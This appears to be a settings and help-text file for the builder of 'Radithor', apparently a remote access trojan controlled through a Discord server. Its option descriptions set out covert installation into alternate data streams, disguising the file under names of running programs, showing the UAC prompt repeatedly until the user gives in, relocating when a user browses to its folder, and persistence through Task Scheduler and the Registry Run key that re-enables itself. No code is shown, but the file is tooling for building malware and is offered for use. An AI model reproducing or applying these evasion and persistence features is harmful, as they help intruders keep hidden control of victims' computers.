bot.name: Server ID
bot.info: The ID of the server that will control the bot.

bot.name: Category ID
bot.info: The ID of the category each session will be controlled in, if one is not specified, a category will be auto-generated.

bot.name: Tracking ID
bot.info: A custom ID/code to help you keep track of this build.

setup.name: Use custom directory
setup.info: Installs Radithor to a custom directory. If unchecked, Radithor will install to %USERPROFILE%\Music or an ADS of %PROGRAMFILES%\Windows Media Player if it is elevated.

setup.name: Randomize directory
setup.info: Picks a random directory from %USERPROFILE% or %PROGRAMFILES% if it is elevated. This has priority over "Use custom directory".

setup.name: Use custom name
setup.info: Renames Radithor's file to the value of "Custom name".

setup.name: Custom name
setup.info: The name Radithor will rename itself to.

setup.name: Randomize name
setup.info: Picks a random name from any currently running executable file. This has priority over "Use custom name".

setup.name: Use alternate data stream
setup.info: Installs Radithor to a ADS. This has priority over all the above options.

setup.name: Custom alternate data stream
setup.info: The Path of the ADS Radithor will install itself to. If this is empty, It will install to %USERPROFILE%\AppData or %SYSTEMROOT% if it is elevated.

options.name: Require admin
options.info: Requires Radithor to have admin privileges to run.

options.name: Prompt admin
options.info: Triggers the User Account Control prompt to run Radithor as admin. This requires "Require admin" to be enabled.

options.name: Force admin
options.info: Continuously triggers the User Account Control prompt until the user accepts. This requires "Require admin" to be enabled.

options.name: Continue without admin
options.info: If the user declines the Account Control prompt while "Require admin" is enabled, Radithor will still run. This requires "Require admin" to be enabled.

options.name: Periodic relocation
options.info: Periodically moves Radithor's file to another random location every few minutes as defined in "Relocation interval".

options.name: Relocation interval
options.info: How long in minutes to wait before changing Radithor's file path.

options.name: Relocate on discovery
options.info: Monitors explorer's name and relocates Radithor whenever the name of the directory it is in appears in explorer's name. This will do anything if the settings for viewing hidden files is turned off and Radithor is hidden.

options.name: Instant panic mode
options.info: Turns on Radithor's panic mode after it has initialized. See "panic mode.md" in the wiki for more info. This requires admin privileges to work.

persistence.name: Persistence name
persistence.info: The name of all persistence values or items.

persistence.name: Clone persistence file location
persistence.info: Clones Radithor's file for ever persistence method instead of pointing back to a single file.

persistence.name: Ensure different persistence location
persistence.info: Ensures the file path in the persistence locations never match the currently running file.

persistence.name: Task scheduler
persistence.info: Uses the Task Scheduler, It will start Radithor continuously after that every 8 minutes.

persistence.name: Registry
persistence.info: Uses the Run key in the Registry, It will also enable itself if it was disabled from task manager.

advanced.name: Whitelisted operator IDs
advanced.info: User IDs of users that are allowed to run commands and interact with the bot. Whitelisted users can whitelist other users. If the value of this is empty, everyone in the server will be able to interact with the bot. Separate with ";". %OWNER% will always be the ID of the server owner.

advanced.name: Aggressive launch checks
advanced.info: Saves the first device fingerprint gotten and checks it every time Radithor starts, this will make Radithor unable to start if used on another machine. This option is not recommended.

advanced.name: Involve fingerprint in encryption
advanced.info: Encrypts the config a second time with the first device fingerprint gotten, this will make Radithor unable to start if used on another machine. This option is not recommended.

site.name: End to end encryption
site.info: Encrypts all saved data. Sends only encrypted data to the server.

site.name: Save config
site.info: Saved the data set in the site.

site.name: Obfuscate site title
site.info: Renames the site title to "localhost" and does not show the build status.
